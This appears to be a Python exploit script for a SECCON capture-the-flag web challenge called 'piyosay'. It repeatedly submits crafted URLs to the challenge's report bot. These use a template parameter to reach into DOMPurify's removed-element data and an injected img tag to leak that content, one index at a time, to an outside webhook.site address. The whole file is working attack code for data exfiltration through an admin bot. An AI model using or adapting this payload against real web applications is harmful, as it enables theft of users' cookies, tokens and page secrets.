import time
import requests
from urllib import parse

index = 35

while True:
  params = {
    'emoji': '0/parentNode/defaultView/DOMPurify/removed/0/element/innerHTML/'+str(index),
    'message': '<img src="https://webhook.site/07347ba1-4753-4898-8f1f-534fc387d036/?x={{emoji}}&index='+str(index)+'"><script>'
  }
  data = {
    'url': 'http://web:3000/result?'+parse.urlencode(params)
  }
  print(requests.post('http://piyosay.seccon.games:3000/report',data=data).text)

  index += 1
  time.sleep(32)